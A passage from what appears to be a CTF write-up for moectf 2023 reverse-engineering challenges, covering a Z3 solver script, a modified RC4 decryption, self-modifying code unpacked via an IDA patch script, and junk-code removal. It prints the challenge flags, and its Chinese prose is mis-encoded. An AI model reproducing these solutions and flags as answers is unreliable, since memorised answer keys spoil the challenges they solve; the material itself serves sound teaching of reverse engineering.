class="number">383</span> * v4[<span class="number">4</span>]+ <span class="number">35</span> * v4[<span class="number">3</span>]+ <span class="number">226</span> * v4[<span class="number">2</span>]+ <span class="number">385</span> * v4[<span class="number">1</span>]+ <span class="number">238</span> * v4[<span class="number">0</span>]+ <span class="number">348</span> * v4[<span class="number">7</span>]+ <span class="number">20</span> * v4[<span class="number">8</span>]+ <span class="number">158</span> * v4[<span class="number">16</span>]+ <span class="number">21</span> * v4[<span class="number">17</span>]+ <span class="number">249</span> * v4[<span class="number">23</span>]+ <span class="number">9</span> * v4[<span class="number">25</span>]+ <span class="number">343</span> * v4[<span class="number">30</span>] == <span class="number">603481</span>)</span><br><span class="line">s.add(<span class="number">29</span> * v4[<span class="number">29</span>]+ <span class="number">323</span> * v4[<span class="number">26</span>]+ <span class="number">159</span> * v4[<span class="number">25</span>]+ <span class="number">118</span> * v4[<span class="number">20</span>]+ <span class="number">326</span> * v4[<span class="number">19</span>]+ <span class="number">211</span> * v4[<span class="number">18</span>]+ <span class="number">225</span> * v4[<span class="number">17</span>]+ <span class="number">355</span> * v4[<span class="number">16</span>]+ <span class="number">201</span> * v4[<span class="number">15</span>]+ <span class="number">149</span> * v4[<span class="number">14</span>]+ <span class="number">296</span> * v4[<span class="number">13</span>]+ <span class="number">184</span> * v4[<span class="number">12</span>]+ <span class="number">315</span> * v4[<span class="number">11</span>]+ <span class="number">364</span> * v4[<span class="number">10</span>]+ <span class="number">142</span> * v4[<span class="number">9</span>]+ <span class="number">75</span> * v4[<span class="number">8</span>]+ <span class="number">313</span> * v4[<span class="number">7</span>]+ <span class="number">142</span> * v4[<span class="number">6</span>]+ <span class="number">396</span> * v4[<span class="number">5</span>]+ <span class="number">348</span> * v4[<span class="number">4</span>]+ <span class="number">272</span> * v4[<span class="number">3</span>]+ <span class="number">26</span> * v4[<span class="number">2</span>]+ <span class="number">206</span> * v4[<span class="number">1</span>]+ <span class="number">173</span> * v4[<span class="number">0</span>]+ <span class="number">155</span> * v4[<span class="number">21</span>]+ <span class="number">144</span> * v4[<span class="number">22</span>]+ <span class="number">366</span> * v4[<span class="number">23</span>]+ <span class="number">257</span> * v4[<span class="number">24</span>]+ <span class="number">148</span> * v4[<span class="number">27</span>]+ <span class="number">24</span> * v4[<span class="number">28</span>]+ <span class="number">253</span> * v4[<span class="number">30</span>] == <span class="number">664504</span>)</span><br><span class="line">s.add(<span class="number">4</span> * v4[<span class="number">29</span>]+ <span class="number">305</span> * v4[<span class="number">28</span>]+ <span class="number">226</span> * v4[<span class="number">27</span>]+ <span class="number">212</span> * v4[<span class="number">26</span>]+ <span class="number">175</span> * v4[<span class="number">25</span>]+ <span class="number">93</span> * v4[<span class="number">24</span>]+ <span class="number">165</span> * v4[<span class="number">23</span>]+ <span class="number">341</span> * v4[<span class="number">20</span>]+ <span class="number">14</span> * v4[<span class="number">19</span>]+ <span class="number">394</span> * v4[<span class="number">18</span>]+ (v4[<span class="number">17</span>] * <span class="number">2</span> ** <span class="number">8</span>)+ <span class="number">252</span> * v4[<span class="number">16</span>]+ <span class="number">336</span> * v4[<span class="number">15</span>]+ <span class="number">38</span> * v4[<span class="number">14</span>]+ <span class="number">82</span> * v4[<span class="number">13</span>]+ <span class="number">155</span> * v4[<span class="number">12</span>]+ <span class="number">215</span> * v4[<span class="number">11</span>]+ <span class="number">331</span> * v4[<span class="number">10</span>]+ <span class="number">230</span> * v4[<span class="number">9</span>]+ <span class="number">241</span> * v4[<span class="number">8</span>]+ <span class="number">225</span> * v4[<span class="number">7</span>]+ <span class="number">186</span> * v4[<span class="number">4</span>]+ <span class="number">90</span> * v4[<span class="number">3</span>]+ <span class="number">50</span> * v4[<span class="number">2</span>]+ <span class="number">62</span> * v4[<span class="number">1</span>]+ <span class="number">34</span> * v4[<span class="number">0</span>]+ <span class="number">237</span> * v4[<span class="number">5</span>]+ <span class="number">11</span> * v4[<span class="number">6</span>]+ <span class="number">336</span> * v4[<span class="number">21</span>]+ <span class="number">36</span> * v4[<span class="number">22</span>]+ <span class="number">29</span> * v4[<span class="number">30</span>] == <span class="number">473092</span>)</span><br><span class="line">s.add(<span class="number">353</span> * v4[<span class="number">29</span>]+ <span class="number">216</span> * v4[<span class="number">28</span>]+ <span class="number">252</span> * v4[<span class="number">27</span>]+ <span class="number">8</span> * v4[<span class="number">26</span>]+ <span class="number">62</span> * v4[<span class="number">25</span>]+ <span class="number">233</span> * v4[<span class="number">24</span>]+ <span class="number">254</span> * v4[<span class="number">23</span>]+ <span class="number">303</span> * v4[<span class="number">22</span>]+ <span class="number">234</span> * v4[<span class="number">21</span>]+ <span class="number">303</span> * v4[<span class="number">20</span>]+ (v4[<span class="number">19</span>] * <span class="number">2</span> ** <span class="number">8</span>)+ <span class="number">148</span> * v4[<span class="number">18</span>]+ <span class="number">324</span> * v4[<span class="number">17</span>]+ <span class="number">317</span> * v4[<span class="number">16</span>]+ <span class="number">213</span> * v4[<span class="number">15</span>]+ <span class="number">309</span> * v4[<span class="number">14</span>]+ <span class="number">28</span> * v4[<span class="number">13</span>]+ <span class="number">280</span> * v4[<span class="number">11</span>]+ <span class="number">118</span> * v4[<span class="number">10</span>]+ <span class="number">58</span> * v4[<span class="number">9</span>]+ <span class="number">50</span> * v4[<span class="number">8</span>]+ <span class="number">155</span> * v4[<span class="number">7</span>]+ <span class="number">161</span> * v4[<span class="number">6</span>]+ (v4[<span class="number">5</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">303</span> * v4[<span class="number">4</span>]+ <span class="number">76</span> * v4[<span class="number">3</span>]+ <span class="number">43</span> * v4[<span class="number">2</span>]+ <span class="number">109</span> * v4[<span class="number">1</span>]+ <span class="number">102</span> * v4[<span class="number">0</span>]+ <span class="number">93</span> * v4[<span class="number">30</span>] == <span class="number">497492</span>)</span><br><span class="line">s.add(<span class="number">89</span> * v4[<span class="number">29</span>]+ <span class="number">148</span> * v4[<span class="number">28</span>]+ <span class="number">82</span> * v4[<span class="number">27</span>]+ <span class="number">53</span> * v4[<span class="number">26</span>]+ <span class="number">274</span> * v4[<span class="number">25</span>]+ <span class="number">220</span> * v4[<span class="number">24</span>]+ <span class="number">202</span> * v4[<span class="number">23</span>]+ <span class="number">123</span> * v4[<span class="number">22</span>]+ <span class="number">231</span> * v4[<span class="number">21</span>]+ <span class="number">169</span> * v4[<span class="number">20</span>]+ <span class="number">278</span> * v4[<span class="number">19</span>]+ <span class="number">259</span> * v4[<span class="number">18</span>]+ <span class="number">208</span> * v4[<span class="number">17</span>]+ <span class="number">219</span> * v4[<span class="number">16</span>]+ <span class="number">371</span> * v4[<span class="number">15</span>]+ <span class="number">181</span> * v4[<span class="number">12</span>]+ <span class="number">104</span> * v4[<span class="number">11</span>]+ <span class="number">392</span> * v4[<span class="number">10</span>]+ <span class="number">285</span> * v4[<span class="number">9</span>]+ <span class="number">113</span> * v4[<span class="number">8</span>]+ <span class="number">298</span> * v4[<span class="number">7</span>]+ <span class="number">389</span> * v4[<span class="number">6</span>]+ <span class="number">322</span> * v4[<span class="number">5</span>]+ <span class="number">338</span> * v4[<span class="number">4</span>]+ <span class="number">237</span> * v4[<span class="number">3</span>]+ <span class="number">234</span> * v4[<span class="number">0</span>]+ <span class="number">261</span> * v4[<span class="number">1</span>]+ <span class="number">10</span> * v4[<span class="number">2</span>]+ <span class="number">345</span> * v4[<span class="number">13</span>]+ <span class="number">3</span> * v4[<span class="number">14</span>]+ <span class="number">361</span> * v4[<span class="number">30</span>] == <span class="number">659149</span>)</span><br><span class="line">s.add(<span class="number">361</span> * v4[<span class="number">29</span>]+ <span class="number">359</span> * v4[<span class="number">28</span>]+ <span class="number">93</span> * v4[<span class="number">27</span>]+ <span class="number">315</span> * v4[<span class="number">26</span>]+ <span class="number">69</span> * v4[<span class="number">25</span>]+ <span class="number">137</span> * v4[<span class="number">24</span>]+ <span class="number">69</span> * v4[<span class="number">23</span>]+ <span class="number">58</span> * v4[<span class="number">22</span>]+ <span class="number">300</span> * v4[<span class="number">21</span>]+ <span class="number">371</span> * v4[<span class="number">20</span>]+ <span class="number">264</span> * v4[<span class="number">19</span>]+ <span class="number">317</span> * v4[<span class="number">18</span>]+ <span class="number">215</span> * v4[<span class="number">17</span>]+ <span class="number">155</span> * v4[<span class="number">16</span>]+ <span class="number">215</span> * v4[<span class="number">15</span>]+ <span class="number">330</span> * v4[<span class="number">14</span>]+ <span class="number">239</span> * v4[<span class="number">13</span>]+ <span class="number">212</span> * v4[<span class="number">12</span>]+ <span class="number">88</span> * v4[<span class="number">11</span>]+ <span class="number">82</span> * v4[<span class="number">10</span>]+ <span class="number">354</span> * v4[<span class="number">9</span>]+ <span class="number">85</span> * v4[<span class="number">8</span>]+ <span class="number">310</span> * v4[<span class="number">7</span>]+ <span class="number">84</span> * v4[<span class="number">6</span>]+ <span class="number">374</span> * v4[<span class="number">5</span>]+ <span class="number">380</span> * v4[<span class="number">4</span>]+ <span class="number">215</span> * v4[<span class="number">3</span>]+ <span class="number">351</span> * v4[<span class="number">2</span>]+ <span class="number">141</span> * v4[<span class="number">1</span>]+ <span class="number">115</span> * v4[<span class="number">0</span>]+ <span class="number">108</span> * v4[<span class="number">30</span>] == <span class="number">629123</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> v4:</span><br><span class="line">    	<span class="keyword">if</span> (<span class="built_in">str</span>(m[v]) == <span class="string">&#x27;None&#x27;</span>):<span class="keyword">continue</span></span><br><span class="line">        i = m[v]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(i))),end=<span class="string">&quot;&quot;</span>) // iæ˜¯<span class="built_in">int</span> ref,éœ€è¦è½¬<span class="built_in">str</span>ç„¶åè½¬<span class="built_in">int</span></span><br></pre></td></tr></table></figure>



<h2 id="RRRRRc4"><a href="#RRRRRc4" class="headerlink" title="RRRRRc4"></a>RRRRRc4</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1400795E0</span><span class="params">(__int64 a1, __int64 a2, __int64 inputString, <span class="type">int</span> a4, __int64 key, <span class="type">unsigned</span> <span class="type">int</span> a6)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+A4h] [rbp+84h]</span></span><br><span class="line"></span><br><span class="line">  result = sub_14007555C(&amp;unk_1401A7007);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + i) = i;</span><br><span class="line">    *(_BYTE *)(a2 + i) = *(_BYTE *)(key + i % a6);</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (*(<span class="type">unsigned</span> __int8 *)(a2 + j) + *(<span class="type">unsigned</span> __int8 *)(a1 + j) + v10) % <span class="number">256</span>;</span><br><span class="line">    v12 = *(_BYTE *)(a1 + v10);</span><br><span class="line">    *(_BYTE *)(a1 + v10) = *(_BYTE *)(a1 + j);</span><br><span class="line">    *(_BYTE *)(a1 + j) = v12;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(j + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v11 = (*(<span class="type">unsigned</span> __int8 *)(a1 + v9) + v11) % <span class="number">256</span>;</span><br><span class="line">    v13 = *(_BYTE *)(a1 + v11);</span><br><span class="line">    *(_BYTE *)(a1 + v11) = *(_BYTE *)(a1 + v9);</span><br><span class="line">    *(_BYTE *)(a1 + v9) = v13;</span><br><span class="line">    *(_BYTE *)(inputString + v14++) ^= *(_BYTE *)(a1</span><br><span class="line">                                                + (*(<span class="type">unsigned</span> __int8 *)(a1 + v11) + *(<span class="type">unsigned</span> __int8 *)(a1 + v9)) % <span class="number">256</span>);</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)--a4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆå§‹åŒ–æ•°ç»„ äº§ç”Ÿä¸€ä¸ªsç›’ å¼‚æˆ–ä¸Šsç›’ æ˜¯rc4çš„ç‰¹å¾ï¼Œä¸è¿‡ä¸æ˜¯æ ‡å‡†çš„rc4ï¼Œæ‰€ä»¥éœ€è¦è·Ÿç€é€»è¾‘å†™ä¸€ä¸‹ç„¶åè§£å¯†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a1[<span class="number">256</span>], a2[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a3[] = &#123;</span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x9B</span>, <span class="number">0xFB</span>, <span class="number">0x19</span>, <span class="number">0x06</span>, <span class="number">0x6A</span>, <span class="number">0xB5</span>, <span class="number">0x3B</span>, <span class="number">0x7C</span>, <span class="number">0xBA</span>, <span class="number">0x03</span>, <span class="number">0xF3</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0xB6</span>,</span><br><span class="line">        <span class="number">0x3D</span>, <span class="number">0x8A</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x2E</span>, <span class="number">0x50</span>, <span class="number">0x11</span>, <span class="number">0xE7</span>, <span class="number">0xC7</span>, <span class="number">0x4F</span>, <span class="number">0xB1</span>, <span class="number">0x27</span>, <span class="number">0xCF</span>, <span class="number">0xF3</span>, <span class="number">0xAE</span>,</span><br><span class="line">        <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xB2</span>, <span class="number">0x08</span>, <span class="number">0xFB</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> a4 = <span class="number">38</span>;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;moectf2023&quot;</span>;</span><br><span class="line">    <span class="type">int</span> a6 = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> v9 = <span class="number">0</span>, v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v13 = <span class="number">0</span>, v14 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        a1[i] = i;</span><br><span class="line">        a2[i] = key[i % a6];</span><br><span class="line">        result = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">        v10 = (a2[j] + a1[j] + v10) % <span class="number">256</span>;</span><br><span class="line">        <span class="type">int</span> v12 = a1[v10];</span><br><span class="line">        a1[v10] = a1[j];</span><br><span class="line">        a1[j] = v12;</span><br><span class="line">        result = j + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (a4) &#123;</span><br><span class="line">        v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        v11 = (a1[v9] + v11) % <span class="number">256</span>;</span><br><span class="line">        v13 = a1[v11];</span><br><span class="line">        a1[v11] = a1[v9];</span><br><span class="line">        a1[v9] = v13;</span><br><span class="line">        a3[v14] ^= a1[(a1[v11] + a1[v9]) % <span class="number">256</span>];</span><br><span class="line">        v14++;</span><br><span class="line">        a4--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a3); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, a3[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>asciiè§£å¯†æ‹¿åˆ°flag moectf{y0u_r3a11y_understand_rc4!!!!}</p>
<h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><p>Self-Modifying Codeé¡¾åæ€ä¹‰ï¼Œå·¥ä½œèµ·æ¥åˆ†ä¸‰æ­¥ï¼Œç¼–è¯‘çš„æ—¶å€™å°†å‡½æ•°çš„å­—èŠ‚ç åŠ å¯†æ’å…¥ç¨‹åºï¼Œç„¶åç”¨VirtualProtectä¿®æ”¹å†…å­˜çš„ä¿æŠ¤(textæ®µä¿®æ”¹æˆå¯å†™çš„)ï¼Œç„¶åè¿è¡Œè§£å¯†å‡½æ•°å°†è¿™ä¸ªå‡½æ•°è§£å¯†</p>
<p>æŸ¥è¯¢äº†ä¸€ä¸‹ï¼Œå¤§å¤šæ•°smcç›¸å…³çš„é¢˜ç›®æœ‰å…³å­—èŠ‚ç åŠ å¯†çš„æ“ä½œä½¿ç”¨å¼‚æˆ–çš„æŒºå¤šçš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+0h] [ebp-78h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+0h] [ebp-78h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401087(aPlzInputYourFl, v4);</span><br><span class="line">  sub_401023(aS, (<span class="type">char</span>)v6);</span><br><span class="line">  sub_4011E0();</span><br><span class="line">  <span class="keyword">if</span> ( sub_401050(v6) )</span><br><span class="line">    sub_401087(aGood, v5);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_401087(aTryAgainPlease, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‰é¢çš„æ˜¯vfprintå’Œvfscanf</p>
<p>sub_4011E0(); returnäº†ä¸€ä¸ª sub_401550()</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_401550()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> result; // eax</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+4h] [ebp-1Ch]</span><br><span class="line">  DWORD flOldProtect[<span class="number">2</span>]; // [esp+18h] [ebp-8h] BYREF</span><br><span class="line"></span><br><span class="line">  flOldProtect[<span class="number">1</span>] = -<span class="number">858993460</span>;</span><br><span class="line">  flOldProtect[<span class="number">0</span>] = (DWORD)malloc(8u);</span><br><span class="line">  result = VirtualProtect((char *)&amp;loc_4014D0 - (unsigned <span class="built_in">int</span>)&amp;loc_4014D0 % <span class="number">0x1000</span>, 0x1000u, 0x80u, flOldProtect);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">122</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)&amp;loc_4014D0 + i) ^= 0x66u;</span><br><span class="line">    result = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>VirtualProtectä¿®æ”¹äº†å†…å­˜é¡µçš„æƒé™ï¼Œå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œå¹¶å¡«å……0xccccåˆå§‹åŒ–äº†ï¼Œç„¶åä¸‹é¢loc_4014D0 æŒ‰å­—èŠ‚å¼‚æˆ–0x66u 122æ¬¡</p>
<p>ä½¿ç”¨idaä¸­çš„script commandæŠŠ0x4014D0ä»¥åŠå¾€åçš„121ä¸ªå­—èŠ‚å¤„ç†ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4014D0</span>,<span class="number">0x40154a</span>):</span><br><span class="line">    patch_byte(i,get_wide_byte(i)^<span class="number">0x66</span>)</span><br></pre></td></tr></table></figure>

<p>å‡ºç°äº†push ebpï¼Œä¸‹é¢çš„å…¨æ˜¯db,è½¬æˆæ•°ç»„ç„¶åè½¬codeè½¬functionï¼Œæ³¨æ„ç¬¬ä¸€ä¸ªdbçš„ä½ç½®æ˜¯4014D1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl sub_4014D1(<span class="built_in">int</span> a1, char *Str)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+0h] [ebp-8h]</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp+4h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; strlen(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((unsigned __int8)(Str[i] + <span class="number">57</span>) ^ <span class="number">0x39</span>) != (unsigned __int8)byte_40A000[i] )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ifä¸­æ˜¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_401050</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMPOUT(<span class="number">0x4014D0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªéœ€è¦æŠŠbyte_40A000[i]å¼‚æˆ–ä¸€é0x39 -57ç„¶åè½¬asciiå°±èƒ½æ‹¿åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0x9f</span>, <span class="number">0x91</span>, <span class="number">0xa7</span>, <span class="number">0xa5</span>, <span class="number">0x94</span>, <span class="number">0xa6</span>, <span class="number">0x8d</span>, <span class="number">0xb5</span>, <span class="number">0xa7</span>, <span class="number">0x9c</span>, <span class="number">0xa6</span>, <span class="number">0xa1</span>, <span class="number">0xbf</span>, <span class="number">0x91</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xa6</span>, <span class="number">0x53</span>, <span class="number">0xa5</span>, <span class="number">0xa3</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0x8f</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>]</span><br><span class="line">flag = [i ^ <span class="number">0x39</span> <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">flag = [i - <span class="number">57</span> <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>moectf{Self_Mod1f1cation}</p>
<h2 id="junk-code"><a href="#junk-code" class="headerlink" title="junk_code"></a>junk_code</h2><p>sub_45A9A0(Str, 18) &amp;&amp; sub_459EBF(v5, 18)ä¸­æœ‰callèŠ±æŒ‡ä»¤å½±å“idaåˆ†æï¼Œåªéœ€è¦patch 0x90(nop)æ‰idaå°±èƒ½æ­£å¸¸åˆ†æäº†</p>
